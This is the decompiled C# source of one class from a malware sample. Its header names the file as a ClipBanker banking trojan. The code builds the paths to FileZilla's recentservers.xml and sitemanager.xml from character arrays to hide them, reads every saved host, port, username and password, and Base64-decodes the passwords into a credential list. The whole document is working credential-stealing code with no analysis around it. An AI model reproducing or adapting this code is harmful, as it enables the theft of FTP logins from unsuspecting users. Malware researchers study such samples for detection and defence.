// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Applications.FZ
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Data.Helpers;
using FtpClient.Models.Info;
using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

namespace FtpClient.Data.Applications
{
  public static class FZ
  {
    public static List<InfoClass4> Get()
    {
      List<InfoClass4> infoClass4List = new List<InfoClass4>();
      try
      {
        string str1 = string.Format(new string(new char[31]
        {
          '{',
          '0',
          '}',
          '\\',
          'F',
          'i',
          'l',
          'e',
          'Z',
          'i',
          'l',
          'l',
          'a',
          '\\',
          'r',
          'e',
          'c',
          'e',
          'n',
          't',
          's',
          'e',
          'r',
          'v',
          'e',
          'r',
          's',
          '.',
          'x',
          'm',
          'l'
        }), (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        string str2 = string.Format(new string(new char[29]
        {
          '{',
          '0',
          '}',
          '\\',
          'F',
          'i',
          'l',
          'e',
          'Z',
          'i',
          'l',
          'l',
          'a',
          '\\',
          's',
          'i',
          't',
          'e',
          'm',
          'a',
          'n',
          'a',
          'g',
          'e',
          'r',
          '.',
          'x',
          'm',
          'l'
        }), (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        if (File.Exists(str1))
          infoClass4List.AddRange((IEnumerable<InfoClass4>) FZ.GetCreds(str1));
        if (File.Exists(str2))
          infoClass4List.AddRange((IEnumerable<InfoClass4>) FZ.GetCreds(str2));
      }
      catch
      {
      }
      return infoClass4List;
    }

    private static List<InfoClass4> GetCreds(string Path)
    {
      List<InfoClass4> creds = new List<InfoClass4>();
      try
      {
        XmlTextReader reader = new XmlTextReader(Path);
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load((XmlReader) reader);
        foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
        {
          InfoClass4 recent = FZ.GetRecent(childNode);
          if (recent.Object2 != "UNKNOWN" && recent.Object1 != "UNKNOWN")
            creds.Add(recent);
        }
      }
      catch
      {
      }
      return creds;
    }

    private static InfoClass4 GetRecent(XmlNode xmlNode)
    {
      InfoClass4 recent = new InfoClass4();
      try
      {
        foreach (XmlNode childNode in xmlNode.ChildNodes)
        {
          if (childNode.Name == "Host")
            recent.Object1 = childNode.InnerText;
          if (childNode.Name == "Port")
            recent.Object1 = recent.Object1 + ":" + childNode.InnerText;
          if (childNode.Name == "User")
            recent.Object2 = childNode.InnerText;
          if (childNode.Name == "Pass")
            recent.Object3 = CryptoHelper.Base64Decode(childNode.InnerText);
        }
      }
      catch
      {
      }
      finally
      {
        recent.Object2 = string.IsNullOrEmpty(recent.Object2) ? "UNKNOWN" : recent.Object2;
        recent.Object1 = string.IsNullOrEmpty(recent.Object1) ? "UNKNOWN" : recent.Object1;
        recent.Object3 = string.IsNullOrEmpty(recent.Object3) ? "UNKNOWN" : recent.Object3;
      }
      return recent;
    }
  }
}
